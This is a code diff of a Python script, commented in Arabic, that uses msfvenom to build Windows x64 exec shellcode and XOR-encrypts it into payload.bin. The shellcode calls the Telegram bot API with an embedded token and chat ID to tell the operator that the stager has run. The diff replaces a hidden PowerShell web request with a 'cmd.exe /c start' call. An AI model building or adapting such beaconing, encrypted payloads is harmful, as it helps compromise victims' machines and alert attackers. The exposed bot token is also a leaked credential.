@@ -1,18 +1,16 @@
 import subprocess
 import sys
-import os
 
-def generate_telegram_payload():
-    # الأمر الذي سيقوم الشيلكود بتنفيذه صامتاً في الخلفية لإرسال تنبيه تليجرام
-    # يحتوي على الـ Token والـ Chat ID الخاص بك مباشرة
-    telegram_url = "https://api.telegram.org/bot8950841983:AAF8BtK2AtpdsQ-eS8ulIrxRVHlnPKoKRVg/sendMessage?chat_id=-5348144328&text=Stager_Execution_Success_Confirmed!"
+def generate_short_payload():
+    # تقليص النص وتجهيز رابط التيليجرام بشكل مباشر وآمن
+    telegram_url = "https://api.telegram.org/bot8950841983:AAF8BtK2AtpdsQ-eS8ulIrxRVHlnPKoKRVg/sendMessage?chat_id=-5348144328&text=Stager_Execution_Success"
     
-    # صياغة أمر PowerShell الخفي لتنفيذ الطلب بدون إظهار نوافذ سوداء
-    cmd = f'powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri \'{telegram_url}\'"'
+    # استخدام أمر cmd مباشر مع start لتفادي مشاكل القص والـ PowerShell
+    cmd = f"cmd.exe /c start {telegram_url}"
     
-    print(f"[*] Generating x64 Exec shellcode for Telegram notification...")
+    print(f"[*] Generating optimized x64 Exec shellcode...")
     
-    # استخدام msfvenom لتوليد شيلكود تنفيذ أمر نظيف لبيئة x64
+    # استخدام msfvenom لتوليد شيلكود تنفيذ أمر خفيف ومباشر لبيئة x64
     msf_cmd = [
         "msfvenom",
         "-p", "windows/x64/exec",
@@ -43,4 +41,4 @@ def generate_telegram_payload():
     print(f"[+] Success! Encrypted payload.bin (XOR 0x55) generated. Size: {len(encrypted_payload)} bytes")
 
 if __name__ == "__main__":
-    generate_telegram_payload()
+    generate_short_payload()
